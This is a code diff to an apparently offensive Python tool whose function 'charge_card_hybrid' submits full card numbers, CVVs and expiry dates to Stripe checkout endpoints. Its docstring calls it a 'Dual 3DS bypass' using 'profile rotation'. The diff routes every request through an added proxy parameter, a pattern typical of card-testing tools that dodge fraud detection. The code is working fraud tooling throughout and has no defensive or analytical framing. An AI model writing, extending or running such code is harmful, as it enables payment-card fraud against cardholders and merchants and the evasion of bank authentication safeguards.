@@ -16,7 +16,7 @@ HEADERS = {
 
 API_URL = "https://web-production-2f61.up.railway.app"
 
-async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, session: aiohttp.ClientSession, checkout_url: str = None) -> dict:
+async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, session: aiohttp.ClientSession, checkout_url: str = None, proxy: str = None) -> dict:
     """Dual 3DS bypass: Try method 1 (profile rotation) first, then method 2 (API) if needed"""
     start = time.perf_counter()
     result = {
@@ -54,7 +54,7 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
         # Create payment method
         pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
         
-        async with session.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body) as r:
+        async with session.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body, proxy=proxy) as r:
             pm = await r.json()
         
         if "error" in pm:
@@ -123,7 +123,7 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
         # Confirm payment
         conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
         
-        async with session.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=conf_body) as r:
+        async with session.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=conf_body, proxy=proxy) as r:
             conf = await r.json()
         
         if "error" in conf:
@@ -161,7 +161,7 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
             logger.info("🔐 3DS detected - trying Method 1 (profile rotation)")
             
             # METHOD 1: Try 3DS bypass with profile rotation
-            bypass_result = await try_3ds_bypass(session, three_ds_source, pk)
+            bypass_result = await try_3ds_bypass(session, three_ds_source, pk, proxy)
             
             if bypass_result.get("success"):
                 # Bypass succeeded - check payment status
@@ -170,7 +170,8 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
                 async with session.get(
                     f"https://api.stripe.com/v1/payment_intents/{pi_id}",
                     params={"key": pk, "client_secret": pi_secret},
-                    headers=HEADERS
+                    headers=HEADERS,
+                    proxy=proxy
                 ) as r:
                     pi_check = await r.json()
                 
